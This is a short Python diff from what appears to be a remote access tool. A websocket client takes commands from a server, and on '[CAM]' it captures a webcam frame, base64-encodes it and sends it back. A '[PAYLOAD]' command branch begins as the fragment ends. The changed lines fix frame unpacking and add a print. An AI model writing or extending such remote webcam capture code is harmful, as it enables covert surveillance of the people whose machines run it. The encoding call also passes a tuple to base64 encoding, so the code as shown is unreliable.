@@ -43,7 +43,9 @@ def main():
             try:
                 cmd =  ws.recv()
                 if cmd == "[CAM]":
-                    jpg_as_text = base64.b64encode(cv2.imencode('.jpg', cam.get_frame()))
+                    ret, frame = cam.get_frame()
+                    jpg_as_text = base64.b64encode(cv2.imencode('.jpg', frame))
+                    print(jpg_as_text)
                     ws.send(jpg_as_text)
                     continue
                 if cmd == "[PAYLOAD]":
